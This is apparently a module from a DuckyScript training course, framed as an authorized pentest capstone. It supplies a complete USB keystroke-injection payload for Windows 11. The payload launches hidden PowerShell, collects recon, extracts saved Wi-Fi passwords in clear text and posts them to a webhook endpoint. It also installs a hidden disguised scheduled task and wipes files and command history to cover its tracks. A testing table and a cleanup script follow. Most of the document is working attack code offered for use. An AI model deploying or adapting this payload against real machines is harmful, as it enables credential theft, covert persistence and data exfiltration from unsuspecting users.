Scenario Brief

The Engagement: Acme Corp Physical Pentest

Your client, Acme Corp (represented in your lab by a Windows 11 VM), has engaged your firm to conduct a physical penetration test of their corporate workstations. The scope is limited to one workstation in the IT department. The goal is to demonstrate the risk of an insider threat or a momentary unattended workstation scenario.

Engagement Scope

Target: One Windows 11 22H2 workstation (your lab VM). Account level: standard domain user (no local admin). Duration: payload must complete in under 30 seconds of physical access. Objectives: (1) gather system and network recon, (2) establish persistence via scheduled task, (3) simulate data exfiltration to attacker-controlled endpoint, (4) clean up payload artifacts.

Phase 2 — The Payload

Complete Engagement Payload

This is the complete, production-grade payload combining all four objectives. Every line is annotated. Before deploying, replace YOUR-WEBHOOK-UUID with your actual webhook.site endpoint.

DuckyScript — capstone-engagement.dd (Full Payload) 
REM ============================================================
REM Payload: Full Engagement Simulation — Capstone
REM Course: DuckyScript Mastery — Module 08
REM Target: Windows 11 22H2 (lab VM)
REM Auth: AUTHORIZED LAB EXERCISE ONLY
REM Objectives: Recon, Persistence, Exfil, Cleanup
REM ============================================================

REM Global timing — increase to 200 if in a slow VM
DEFAULTDELAY 100

REM Phase 1: Initial delay for USB enumeration to complete
DELAY 3500

REM Phase 2: Open hidden PowerShell via Run dialog
GUI r
DELAY 800

REM Phase 3: Single compound PowerShell command handles all objectives
REM Broken into logical sections via semicolons within the -Command string
STRING powershell -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command "$wh='https://webhook.site/YOUR-WEBHOOK-UUID'; $out='C:\Users\Public\.tmp_report'; $h=$env:COMPUTERNAME; $u=$env:USERNAME; $d=$env:USERDOMAIN; systeminfo | Out-File $out; whoami /all | Out-File $out -Append; ipconfig /all | Out-File $out -Append; arp -a | Out-File $out -Append; (netsh wlan show profiles) | Select-String 'All User Profile' | ForEach-Object { $p=($_ -split ':')[1].Trim(); $k=(netsh wlan show profile name=$p key=clear) | Select-String 'Key Content'; \"$p : $(($k -split ':')[1].Trim())\" } | Out-File $out -Append; $body=@{host=$h;user=$u;domain=$d;data=(Get-Content $out -Raw)} | ConvertTo-Json; try { Invoke-RestMethod -Uri $wh -Method POST -Body $body -ContentType 'application/json' -TimeoutSec 10 } catch {}; $ta=New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoP -W Hidden -Exec Bypass -Command \"Start-Sleep 1\"'; $tt=New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME; $ts=New-ScheduledTaskSettingsSet -Hidden; Register-ScheduledTask -TaskName 'WinHealthMonitor' -Action $ta -Trigger $tt -Settings $ts -ErrorAction SilentlyContinue | Out-Null; Remove-Item $out -Force -ErrorAction SilentlyContinue; Clear-History; Remove-Item (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue"
ENTER

REM Phase 4: Wait for PowerShell to complete (systeminfo can take 10+ seconds on domain)
DELAY 15000

REM Payload complete — Pi Pico can be removed after this delay
String Length Warning

The compound command string above is intentionally long to fit in a single STRING command. In practice, for complex payloads, split the logic into a PowerShell script file dropped to the USB drive (using combined HID+storage mode from Module 06) and execute it with a short reference command. This reduces the risk of keystroke dropping on the long STRING and makes the payload easier to maintain.

Phase 3

Testing Methodology

A payload that works once in ideal conditions is not a reliable payload. Professional testing ensures consistent success across variable conditions.

TestConditionPass Criteria
Cold boot testPlug in during Windows login screenPayload completes without error; webhook receives data
Locked workstation testPlug in after Win+L lockPayload completes after user logs back in (logon trigger fires)
Slow VM testReduce VM RAM to 2GB and set single CPUAll commands complete with DEFAULTDELAY 200; no keystroke drops
Network restriction testBlock webhook.site at firewallPayload fails gracefully (try/catch); scheduled task still installs
AV active testEnable Windows Defender with real-time protectionAssess which components are flagged; note for report
Repeat run testRun payload 3 times without revertingNo duplicate errors; idempotent execution

PowerShell — Engagement Cleanup Script (Run After Every Test) 
# Post-engagement cleanup — removes all capstone artifacts
# Run this on the target VM after completing testing

# Remove persistence
Unregister-ScheduledTask -TaskName "WinHealthMonitor" -Confirm:$false -ErrorAction SilentlyContinue
Unregister-ScheduledTask -TaskName "WindowsUpdateHelper" -Confirm:$false -ErrorAction SilentlyContinue

# Remove registry run keys if added
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsDefenderSync" -ErrorAction SilentlyContinue

# Remove output files
$files = @(
    "C:\Users\Public\recon_output.txt",
    "C:\Users\Public\sysinfo.txt",
    "C:\Users\Public\wifi.txt",
    "C:\Users\Public\installed.txt",
    "C:\Users\Public\.tmp_report",
    "C:\Users\Public\ducky-test.txt"
)
$files | ForEach-Object { Remove-Item $_ -Force -ErrorAction SilentlyContinue }

# Remove startup folder shortcuts if added
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
Remove-Item "$startupPath\SystemHealthCheck.lnk" -Force -ErrorAction SilentlyContinue
Remove-Item "$startupPath\WinHealthMonitor.lnk" -Force -ErrorAction SilentlyContinue

# Clear PowerShell history
Clear-History
Remove-Item (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue

Write-Host "Cleanup complete. Verify manually with Autoruns." -ForegroundColor Green
